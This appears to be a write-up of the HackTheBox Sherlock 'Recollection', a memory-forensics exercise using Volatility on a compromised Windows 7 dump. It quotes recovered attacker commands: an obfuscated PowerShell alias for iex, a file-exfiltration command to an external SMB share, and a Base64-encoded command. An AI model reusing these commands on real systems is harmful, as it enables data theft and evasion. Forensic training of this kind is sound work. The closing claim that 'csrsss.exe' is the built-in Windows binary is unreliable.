---
permalink: /recollection/
layout: page
---
# HTB Sherlock - Recollection

Challenge available for play at [app.hackthebox.com/sherlocks/Recollection](https://app.hackthebox.com/sherlocks/Recollection).

#### Sherlock Scenario
> A junior member of our security team has been performing research and testing on what we believe to be an old and insecure operating system. We believe it may have been compromised & have managed to retrieve a memory dump of the asset. We want to confirm what actions were carried out by the attacker and if any other assets in our environment might be affected. Please answer the questions below.


You can download the `recollection.zip` file (which has the `recollection.bin` we will use through out this post) from the first link on HackTheBox above and follow along if you would like. The password for the file is `hacktheblue`.

I am using the Volatility memory analysis tool for the majority of this challenge. You can find out how to setup Volatility [here](https://cpuu.hashnode.dev/an-introduction-to-volatility-3). For finding out which Volatility commands I needed to use for each question, I used the HackTricks cheatsheet available [here](https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/memory-dump-analysis/volatility-cheatsheet) (it is super helpful!).

### Question 1 & 2
Q1: What is the Operating System of the machine?

Q2: When was the memory dump created?
```
ccrollin@thinkpad-p43s:~/.../recollection$ file recollection.bin
recollection.bin: data
```

`volatility imageinfo -f recollection.bin`
```
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/ccrollin/Documents/htb/recollection/recollection.bin)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf80002a3f120L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0xfffff80002a41000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2022-12-19 16:07:30 UTC+0000
     Image local date and time : 2022-12-19 22:07:30 +0600
```

The operating system of the machine is identified as Windows 7 Service Pack 1 x64 based on the suggested profiles from the Volatility framework. The memory dump was created on December 19, 2022, at 16:07:30 UTC. This information helps to set the context for the timeline and the environment in which the malicious activities took place.

---

### Question 3
Q3: After the attacker gained access to the machine, the attacker copied an obfuscated PowerShell command to the clipboard. What was the command?

`volatility --profile=Win7SP1x64 clipboard -f recollection.bin`

```
Session    WindowStation Format                         Handle Object             Data                                              
---------- ------------- ------------------ ------------------ ------------------ --------------------------------------------------
         1 WinSta0       CF_UNICODETEXT               0x6b010d 0xfffff900c1bef100 (gv '*MDR*').naMe[3,11,2]-joIN''                  
         1 WinSta0       CF_TEXT                  0x7400000000 ------------------                                                   
         1 WinSta0       CF_LOCALE                    0x7d02bd 0xfffff900c209a260                                                   
         1 WinSta0       0x0L                              0x0 ------------------                                                   
```

The obfuscated PowerShell command copied to the clipboard is `(gv '*MDR*').naMe[3,11,2]-joIN''`. This obfuscation technique is used to evade detection by making the command less readable. By using clipboard analysis, we can identify that the attacker prepared this command for execution, indicating the use of sophisticated methods to manipulate the system.

---

### Question 4
Q4: The attacker copied the obfuscated command to use it as an alias for a PowerShell cmdlet. What is the cmdlet name?

`volatility --profile=Win7SP1x64 consoles -f recollection.bin`

```
PS C:\Users\user> (gv '*MDR*').naMe[3,11,2]-joIN''                                                                      
iex
```


The obfuscated command `(gv '*MDR*').naMe[3,11,2]-joIN''` is used as an alias for the `iex` cmdlet, which stands for `Invoke-Expression`. This cmdlet is commonly used to execute a string as a command, similar to `eval` in other programming languages. Recognizing this alias helps in understanding how the attacker intended to execute further malicious commands on the system.

---

### Question 5 & 6
Q5: A CMD command was executed to attempt to exfiltrate a file. What is the full command line?

Q6: Following the above command, now tell us if the file was exfiltrated successfully?

`volatility --profile=Win7SP1x64 consoles -f recollection.bin`

```
PS C:\Users\user> type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt                                                                
The network path was not found.                                                 
At line:1 char:47                                                               
+ type C:\Users\Public\Secret\Confidential.txt > <<<<  \\192.168.0.171\pulice\p 
ass.txt                                                                         
    + CategoryInfo          : OpenError: (:) [], IOException                    
    + FullyQualifiedErrorId : FileOpenFailure                                   
```

The full command line attempted by the attacker to exfiltrate the file is `type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt`. However, this attempt was unsuccessful as indicated by the error message "The network path was not found". This failure shows that the attacker did not manage to exfiltrate the intended file, possibly due to network configuration or the unavailability of the specified path.

---

### Question 7
Q7: The attacker tried to create a readme file. What was the full path of the file?

`volatility --profile=Win7SP1x64 consoles -f recollection.bin`
```
PS C:\Users\user> powershell -e "ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi"
```
`ZWNobyAiaGFja2VkIGJ5IG1hZmlhIiA+ICJDOlxVc2Vyc1xQdWJsaWNcT2ZmaWNlXHJlYWRtZS50eHQi`

```
ccrollin@thinkpad-p43s:~/.../recollection$ base64 -d readme.txt 
echo "hacked by mafia" > "C:\Users\Public\Office\readme.txt"
```
`C:\Users\Public\Office\readme.txt`


The attacker used a Base64-encoded PowerShell command to create a readme file with the content "hacked by mafia". The full path of this file is `C:\Users\Public\Office\readme.txt`. Decoding the Base64 string reveals the command, showing the attacker's method of concealing their actions through encoding.

---

### Question 8 & 9
Q8: What was the Host Name of the machine?

Q9: How many user accounts were in the machine?

`volatility --profile=Win7SP1x64 consoles -f recollection.bin`
```
PS C:\Users\user> net users                                                                                             
                                                                                                                        
User accounts for \\USER-PC                                                                                                       
--------------------------------------------------------------                                        
Administrator            Guest                    user                                                                  
The command completed successfully.                                                                                     
```

`USER-PC`

`3`


The host name of the machine is `USER-PC`, and there are three user accounts: Administrator, Guest, and user. This information is crucial for understanding the system configuration and potential targets for the attacker. The presence of multiple accounts can indicate various levels of access and privileges that the attacker might exploit.

---

### Question 10
Q10: In the `\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge` folder there were some sub-folders where there was a file named passwords.txt. What was the full file location/path?

`volatility --profile=Win7SP1x64 filescan -f recollection.bin`
```
ccrollin@thinkpad-p43s:~/.../recollection$ grep 'password' filescan.recollection.txt 
0x000000011fc10070      1      0 R--rw- \Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt
```

`\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt`


The full file location of `passwords.txt` is found within the Edge browser's user data directory at `\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt`. This file likely contains sensitive information, indicating that the attacker might have targeted it to gather credentials or other private data stored by the browser.

---

### Question 11, 12, & 13
Q11: A malicious executable file was executed using command. The executable EXE file's name was the hash value of itself. What was the hash value?

Q12: Following the previous question, what is the Imphash of the malicous file you found above?

Q13: Following the previous question, tell us the date in UTC format when the malicious file was created?

`volatility --profile=Win7SP1x64 consoles -f recollection.bin`
```
PS C:\Users\user\Downloads> ls                                                  
                                                                                                                                                              
    Directory: C:\Users\user\Downloads                                                                          
                                                                                
Mode                LastWriteTime     Length Name                               
----                -------------     ------ ----                               
-----        12/19/2022   2:59 PM     420864 b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe 
-a---        12/19/2022   9:00 PM     313152 b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.zip 
-a---        12/19/2022   9:00 PM     205646 bf9e9366489541153d0e2cd21bdae11591f6be48407f896b75e1320628346b03.zip 
-a---        12/19/2022   3:00 PM     309248 csrsss.exe                         
-a---        12/17/2022   4:16 PM    5885952 wazuh-agent-4.3.10-1.msi
```
`b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe`

`volatility --profile=Win7SP1x64 filescan -f recollection.bin`
`grep "b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe" filescan.recollection.txt`
```
0x000000011fa45c20     16      0 -W-r-- \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
0x000000011fc1db70      2      0 R--r-d \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
```

`volatility -f recollection.bin --profile=Win7SP1x64 dumpfiles -Q 0x000000011fa45c20 --dump-dir ./dump_dir`
```
Volatility Foundation Volatility Framework 2.6.1
ImageSectionObject 0x11fa45c20   None   \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
DataSectionObject 0x11fa45c20   None   \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
```

`mv dump_dir/file.None.0xfffffa8003b62990.dat dump_dir/b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe`

Now upload `b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe` to VirusTotal

ImpHash is `d3b592cd9481e4f053b5362e22d61595`

Now look at the **History** heading in VirusTotal for the **Creation Time** - `2022-06-22 11:49:04 UTC`

---

### Question 14
Q14: What was the local IP address of the machine?

`volatility --profile=Win7SP1x64 netscan -f recollection.bin`
```
Offset(P)          Proto    Local Address                  Foreign Address      State            Pid      Owner          Created
0x11e01f750        UDPv4    127.0.0.1:1900                 *:*                                   1248     svchost.exe    2022-12-19 15:34:44 UTC+0000
0x11e063940        UDPv4    0.0.0.0:3702                   *:*                                   1248     svchost.exe    2022-12-19 15:33:02 UTC+0000
0x11e063940        UDPv6    :::3702                        *:*                                   1248     svchost.exe    2022-12-19 15:33:02 UTC+0000
0x11e0727d0        UDPv4    0.0.0.0:5355                   *:*                                   288      svchost.exe    2022-12-19 15:32:47 UTC+0000
0x11e09a900        UDPv4    0.0.0.0:0                      *:*                                   288      svchost.exe    2022-12-19 15:32:44 UTC+0000
0x11e09a900        UDPv6    :::0                           *:*                                   288      svchost.exe    2022-12-19 15:32:44 UTC+0000
0x11e09ca60        UDPv4    0.0.0.0:5355                   *:*                                   288      svchost.exe    2022-12-19 15:32:47 UTC+0000
0x11e09ca60        UDPv6    :::5355                        *:*                                   288      svchost.exe    2022-12-19 15:32:47 UTC+0000
0x11e15aec0        UDPv4    0.0.0.0:3702                   *:*                                   1248     svchost.exe    2022-12-19 15:33:02 UTC+0000
0x11e362880        UDPv4    0.0.0.0:55071                  *:*                                   1248     svchost.exe    2022-12-19 15:32:38 UTC+0000
0x11e36fec0        UDPv4    0.0.0.0:55072                  *:*                                   1248     svchost.exe    2022-12-19 15:32:38 UTC+0000
0x11e36fec0        UDPv6    :::55072                       *:*                                   1248     svchost.exe    2022-12-19 15:32:38 UTC+0000
0x11e37a440        UDPv4    0.0.0.0:3702                   *:*                                   1248     svchost.exe    2022-12-19 15:33:02 UTC+0000
0x11e37a440        UDPv6    :::3702                        *:*                                   1248     svchost.exe    2022-12-19 15:33:02 UTC+0000
0x11e3b2bf0        UDPv4    192.168.0.104:138              *:*                                   4        System         2022-12-19 15:32:47 UTC+0000
0x11e3b40e0        UDPv4    192.168.0.104:137              *:*                                   4        System         2022-12-19 15:32:47 UTC+0000
0x11e0055c0        TCPv4    0.0.0.0:445                    0.0.0.0:0            LISTENING        4        System         
0x11e0055c0        TCPv6    :::445                         :::0                 LISTENING        4        System         
0x11e00b740        TCPv4    0.0.0.0:49155                  0.0.0.0:0            LISTENING        472      services.exe   
0x11e00b740        TCPv6    :::49155                       :::0                 LISTENING        472      services.exe   
0x11e0101c0        TCPv4    192.168.0.104:139              0.0.0.0:0            LISTENING        4        System         
0x11e010b30        TCPv4    0.0.0.0:49155                  0.0.0.0:0            LISTENING        472      services.exe   
0x11e204ac0        TCPv4    0.0.0.0:49154                  0.0.0.0:0            LISTENING        856      svchost.exe    
0x11e204ac0        TCPv6    :::49154                       :::0                 LISTENING        856      svchost.exe    
0x11e36b860        TCPv4    0.0.0.0:5357                   0.0.0.0:0            LISTENING        4        System         
0x11e36b860        TCPv6    :::5357                        :::0                 LISTENING        4        System         
0x11dc079d0        TCPv4    192.168.0.104:49315            13.33.88.81:443      ESTABLISHED      -1                      
0x11e43aec0        UDPv4    0.0.0.0:3702                   *:*                                   1248     svchost.exe    2022-12-19 15:33:02 UTC+0000
0x11e521ec0        UDPv4    0.0.0.0:65516                  *:*                                   2588     msedge.exe     2022-12-19 16:04:53 UTC+0000
0x11e9462c0        UDPv6    ::1:1900                       *:*                                   1248     svchost.exe    2022-12-19 15:34:44 UTC+0000
0x11e957cc0        UDPv4    192.168.0.104:1900             *:*                                   1248     svchost.exe    2022-12-19 15:34:44 UTC+0000
0x11e9632c0        UDPv4    0.0.0.0:5005                   *:*                                   2652     wmpnetwk.exe   2022-12-19 15:34:56 UTC+0000
0x11e443760        TCPv4    0.0.0.0:135                    0.0.0.0:0            LISTENING        672      svchost.exe    
0x11e444110        TCPv4    0.0.0.0:135                    0.0.0.0:0            LISTENING        672      svchost.exe    
0x11e444110        TCPv6    :::135                         :::0                 LISTENING        672      svchost.exe    
0x11e455340        TCPv4    0.0.0.0:49152                  0.0.0.0:0            LISTENING        376      wininit.exe    
0x11e455340        TCPv6    :::49152                       :::0                 LISTENING        376      wininit.exe    
0x11e455750        TCPv4    0.0.0.0:49152                  0.0.0.0:0            LISTENING        376      wininit.exe    
0x11e4a44d0        TCPv4    0.0.0.0:49153                  0.0.0.0:0            LISTENING        764      svchost.exe    
0x11e4aa790        TCPv4    0.0.0.0:49153                  0.0.0.0:0            LISTENING        764      svchost.exe    
0x11e4aa790        TCPv6    :::49153                       :::0                 LISTENING        764      svchost.exe    
0x11e5ec930        TCPv4    0.0.0.0:49154                  0.0.0.0:0            LISTENING        856      svchost.exe    
0x11e986150        TCPv4    0.0.0.0:554                    0.0.0.0:0            LISTENING        2652     wmpnetwk.exe   
0x11e986150        TCPv6    :::554                         :::0                 LISTENING        2652     wmpnetwk.exe   
0x11ee935a0        TCPv4    0.0.0.0:49156                  0.0.0.0:0            LISTENING        480      lsass.exe      
0x11f07d3c0        TCPv4    0.0.0.0:49156                  0.0.0.0:0            LISTENING        480      lsass.exe      
0x11f07d3c0        TCPv6    :::49156                       :::0                 LISTENING        480      lsass.exe      
0x11f160ee0        TCPv4    0.0.0.0:10243                  0.0.0.0:0            LISTENING        4        System         
0x11f160ee0        TCPv6    :::10243                       :::0                 LISTENING        4        System         
0x11f881010        UDPv4    0.0.0.0:50039                  *:*                                   2588     msedge.exe     2022-12-19 16:03:53 UTC+0000
0x11fa38010        UDPv4    192.168.0.104:52222            *:*                                   2380     msedge.exe     2022-12-19 16:04:36 UTC+0000
0x11fa42c50        UDPv4    0.0.0.0:5353                   *:*                                   2380     msedge.exe     2022-12-19 15:35:09 UTC+0000
0x11fb498b0        UDPv4    0.0.0.0:64307                  *:*                                   2588     msedge.exe     2022-12-19 16:06:53 UTC+0000
0x11fc954d0        UDPv4    127.0.0.1:49678                *:*                                   1248     svchost.exe    2022-12-19 15:34:44 UTC+0000
0x11fca04d0        UDPv4    0.0.0.0:5004                   *:*                                   2652     wmpnetwk.exe   2022-12-19 15:34:56 UTC+0000
0x11fcf0470        UDPv4    0.0.0.0:5004                   *:*                                   2652     wmpnetwk.exe   2022-12-19 15:34:56 UTC+0000
0x11fcf0470        UDPv6    :::5004                        *:*                                   2652     wmpnetwk.exe   2022-12-19 15:34:56 UTC+0000
0x11fd30ec0        UDPv4    0.0.0.0:50449                  *:*                                   2588     msedge.exe     2022-12-19 16:06:53 UTC+0000
0x11fd4d3a0        UDPv4    0.0.0.0:62043                  *:*                                   2588     msedge.exe     2022-12-19 16:03:39 UTC+0000
0x11fd91010        UDPv4    0.0.0.0:55846                  *:*                                   2588     msedge.exe     2022-12-19 16:05:53 UTC+0000
0x11fda78f0        UDPv4    0.0.0.0:5005                   *:*                                   2652     wmpnetwk.exe   2022-12-19 15:34:56 UTC+0000
0x11fda78f0        UDPv6    :::5005                        *:*                                   2652     wmpnetwk.exe   2022-12-19 15:34:56 UTC+0000
0x11fdb3640        UDPv4    0.0.0.0:5353                   *:*                                   2380     msedge.exe     2022-12-19 15:35:09 UTC+0000
0x11fdb3640        UDPv6    :::5353                        *:*                                   2380     msedge.exe     2022-12-19 15:35:09 UTC+0000
0x11fe21c40        UDPv4    0.0.0.0:55767                  *:*                                   2588     msedge.exe     2022-12-19 16:04:53 UTC+0000
0x11fecab80        UDPv6    fe80::90a1:9bac:7a86:d6cd:1900 *:*                                   1248     svchost.exe    2022-12-19 15:34:44 UTC+0000
0x11ff4ea90        UDPv6    ::1:49677                      *:*                                   1248     svchost.exe    2022-12-19 15:34:44 UTC+0000
0x11ff3b3d0        TCPv4    0.0.0.0:2869                   0.0.0.0:0            LISTENING        4        System         
0x11ff3b3d0        TCPv6    :::2869                        :::0                 LISTENING        4        System         
0x11ff9c4d0        TCPv4    0.0.0.0:554                    0.0.0.0:0            LISTENING        2652     wmpnetwk.exe   
0x11f8395c0        TCPv4    192.168.0.104:49323            199.232.46.132:443   ESTABLISHED      -1                      
0x11fbd4570        TCPv4    192.168.0.104:49340            23.47.190.91:443     ESTABLISHED      -1                      
0x11fbe1010        TCPv4    192.168.0.104:49326            198.144.120.23:80    CLOSED           -1                      
0x11fd21cd0        TCPv4    192.168.0.104:49341            198.144.120.23:443   CLOSE_WAIT       -1                      
0x11fd4b010        TCPv4    192.168.0.104:49325            198.144.120.23:80    CLOSED           -1
```
The local IP address of the machine is `192.168.0.104`

---

### Question 15
Q15: There were multiple PowerShell processes, where one process was a child process. Which process was its parent process?

`volatility --profile=Win7SP1x64 pstree -f recollection.bin`
```
Name                                                  Pid   PPid   Thds   Hnds Time
-------------------------------------------------- ------ ------ ------ ------ ----
. 0xfffffa8003cbc060:cmd.exe                         4052   2032      1     23 2022-12-19 15:40:08 UTC+0000
.. 0xfffffa8005abbb00:powershell.exe                 3532   4052      5    606 2022-12-19 15:44:44 UTC+0000
```
Parent process is `cmd.exe`.

---

### Question 16
Q16: Attacker might have used an email address to login a social media. Can you tell us the email address?

`grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" edge_dump/strings.2380.dmp`
```
gmail.commafia_code1337@gmail.comc
emailmafia_code1337@gmail.com
emailmafia_code1337@gmail.com
a65bded5-284b-407b-86df-db3050f7f451mafia_code1337@gmail.com
CPS-requests@verisign.com
CPS-requests@verisign.com
T@..AA
iVq0xhg@p.yRg
X@evisionsmarketing.com
D@exploit.in
Cv@www.base64encode.org
iVq0xhg@p.yRg
JB@ng-bing-int.com
Ja@windows.msn.cn
Jz@ch.mojom
Ah@bidtellect.com
Pu8@.mkt2478.com
8@6campaignmonitor.com
mp@google.co.id
_ke@smct.io
W0@pons.mojom
fo@www.bing.com
6@duct.desktop.ar
gxjyqY@eanuhot.xyz
P@uct.de
e@eProduct.fr
e_@indovid.top
Y@loop.mojom
o@orkerCache.Cache
X@www.7-zip.org
J@hotmomteenxxx.org
5+@gokkasten.info
n@nswer.trafficmanager.net
p@googleads.g.doubleclick.net
W@ssion.mojom
Z@www.bing.com
M@ng-bing-int.com
Z@ing-exp.com
j@www.base64encode.org
F@www.facebook.com
D@st.mojom
U@tersdesigns.com
s@ldkj827.xrccp.com
X@upmlm.ir
Ys@nstrumentation.mojom
Yi@pons.mojom
pD@www.7-zip.org
p+@base64encode.org
C@duct.desktop.ro
d@hospedium.com
o@bar.com.au
t@ensh.se
g@aren.se
p@us.com
u@uo.com
r@rope.com
m@x.com
a@p.com
z@-gazeta.ru
H@onalsupplementcenter.com
L@st.mojom
W@googleads.g.doubleclick.net
H@vel.mojom
e@vel.mojom
o@googleads.g.doubleclick.net
w@duct.desktop.pt
j@oduct.htm
1o@pons.mojom
1r@settings.mojom
7W@ntp.msn.com
8b@www.bing.com
c@es.mojom
D@el.mojom
N@ch.mojom
f@tedgewelcome.microsoft.com
4@empowerafrica-com.api.oneall.com
O@tection.mojom
W@doubleclick.net
D@doubleclick.net
q@hints.mojom
c@pons.mojom
3@ming.no
B@k.ir
c@ck.ir
x@ntp.msn.com
bX@workRequests.PublicPage.Localhost.OtherRequests.Failed
jp@ing.mojom
j@list.mojom
q@yota.jp
y@l-kr.com
B@azon.com
E@lop.net
b@e.net
K@m.net
X@k.com
v@om.au
O@pley.com.pe
J@ods.com
t@chinai.com
l@amoto.com
G@o.nl
a@kd.com
S@lopx.net
k@imer-safti.fr
u@www.google.com
W@www.base64encode.org
z@tection.mojom
w@ch.mojom
Q@vel.mojom
j@agement.mojom
2@googleads.g.doubleclick.net
c@oodsDetail.do
V@opdetail.html
O@recommercialdoor.com
H@kspaces.mojom
g@cms.blob.core.windows.net
x@.dynamic.tiles.virtualearth.net
q@aming-video-msn-com.akamaized.net
k@kspaces.mojom
g@list.mojom
p@ing.mojom
2@assets.msn.com
b@st.mojom
U@loop.mojom
u@shot.mojom
A@notation.mojom
V@pons.mojom
appro@openssl.org
appro@openssl.org
appro@openssl.org
appro@openssl.org
appro@openssl.org
appro@openssl.org
appro@openssl.org
appro@openssl.org
V@Microsoft.FrameLatency.Scroll
saqirilatu@126.com
am@gameux.dll
00@comres.dll
sw@gameux.dll
31@keyiso.dll
dl@regsvc.dll
sy@oleres.dll
2@his.task
di@appmgmts.dll
50@tzres.dll
M@tzres.dll
ch@tzres.dll
d@tzres.dll
te@tzres.dll
te@tzres.dll
st@tzres.dll
st@tzres.dll
nd@tzres.dll
hf@tzres.dll
ec@tzres.dll
5@tzres.dll
nd@tzres.dll
em@tzres.dll
88@tzres.dll
30@tzres.dll
st@tzres.dll
st@tzres.dll
sy@tzres.dll
dl@tzres.dll
st@tzres.dll
dl@tzres.dll
sy@tzres.dll
32@tzres.dll
sy@tzres.dll
sy@tzres.dll
nd@tzres.dll
or@tzres.dll
g@tzres.dll
ir@tzres.dll
01@tzres.dll
s@tzres.dll
03@tzres.dll
nd@tzres.dll
2.@tzres.dll
st@tzres.dll
im@tzres.dll
st@tzres.dll
ra@tzres.dll
ow@tzres.dll
sy@tzres.dll
nd@tzres.dll
g@tzres.dll
d@tzres.dll
20@tzres.dll
80@tzres.dll
30@tzres.dll
07@tzres.dll
em@tzres.dll
om@tzres.dll
In@tzres.dll
cr@tzres.dll
19@tzres.dll
v4@tzres.dll
In@tzres.dll
v4@tzres.dll
cr@tzres.dll
CPS-requests@verisign.com
CPS-requests@verisign.com
sy@tzres.dll
nd@tzres.dll
or@tzres.dll
g@tzres.dll
ir@tzres.dll
```
Email used in Edge is `mafia_code1337@gmail.com`.

---

### Question 17
Q17: Using MS Edge browser, the victim searched about a SIEM solution. What is the SIEM solution's name?

`volatility -f recollection.bin --profile=Win7SP1x64 memdump -p 2380 -D edge-dump/`

We now have `edge_dump/2380.dmp` as a process dump file.

`strings edge-dump/2380.dmp`

`sort edge_dump/strings.2380.dmp | uniq -c`

`sort -g -r edge_dump/linecounts.2380.dmp`

`grep "\." edge_dump/sorted.linecounts.2380.dmp`

Open `edge_dump/domains.sorted.linecounts.2380.dmp`. This is our browsing history (roughly) sorted by most visited sites.

Looking at the top 10 visited domains, we see the following.

```
   7384 6.1.7600.16385
   3970 ntp.msn.com
   2350 6.1.7601.17514
   1906 www.bing.com
   1373 C:\Windows\system32\en-US\advapi32.dll.mui[MofResourceName]
    832 2.0.0.0
    796 www.base64encode.org
    696 documentation.wazuh.com
    671 img-s-msn-com.akamaized.net
    602 microsoftedgewelcome.microsoft.com
```

`documentation.wazuh.com` is visited `696` times. When looking at this domain, we see it is a documentaiton page for a XDR/SIEM solution called `Wazuh` (the answer).

---

### Question 18
Q18: The victim user downloaded an exe file. The file's name was mimicking a legitimate binary from Microsoft with a typo (i.e. legitimate binary is powershell.exe and attacker named a malware as powershall.exe). Tell us the file name with the file extension?

`volatility --profile=Win7SP1x64 filescan -f recollection.bin`
`grep "\\Downloads.*\.exe" filescan.recollection.txt`
```
0x000000011e955820     16      0 -W-r-- \Device\HarddiskVolume2\Users\user\Downloads\csrsss.exe9541153d0e2cd21bdae11591f6be48407f896b75e1320628346b03.exe
0x000000011fa45c20     16      0 -W-r-- \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
0x000000011fc1db70      2      0 R--r-d \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
0x000000011fd79a90     16      0 RW-rwd \Device\HarddiskVolume2\Users\user\Downloads\7z2201-x64.exe
0x000000011fdeb470     10      0 R--r-d \Device\HarddiskVolume2\Users\user\Downloads\csrsss.exe9541153d0e2cd21bdae11591f6be48407f896b75e1320628346b03.exe
```

`csrsss.exe9541153d0e2cd21bdae11591f6be48407f896b75e1320628346b03.exe`

This file is trying to mimic the builtin Windows file `csrsss.exe`, which deals with [Client/Server Runtime Subsystem](https://en.wikipedia.org/wiki/Client/Server_Runtime_Subsystem) (usually located inside the `System32` directory).